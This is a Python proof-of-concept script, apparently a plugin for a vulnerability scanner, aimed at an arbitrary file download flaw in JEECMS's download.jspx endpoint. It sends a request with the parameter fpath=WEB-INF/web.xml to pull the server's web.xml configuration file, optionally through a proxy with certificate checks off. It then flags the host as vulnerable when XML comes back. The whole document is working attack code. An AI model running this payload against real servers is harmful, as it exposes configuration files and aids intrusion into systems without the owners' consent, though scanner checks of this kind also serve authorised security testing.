#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: jeecms download.jsp 参数fpath任意文件下载
referer: http://www.wooyun.org/bugs/WooYun-2014-77960
author: Ascotbe
reference: Lucifer
description: 文件download.jsp中,参数fpath存在任意文件下载。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/download.jspx?fpath=WEB-INF/web.xml&filename=WEB-INF/web.xml"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    payload_url = scheme+"://"+url+payload
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url, headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if resp.headers["Content-Type"] == "application/xml":
            Medusa = "{} 存在jeecms download.jsp 参数fpath任意文件下载漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass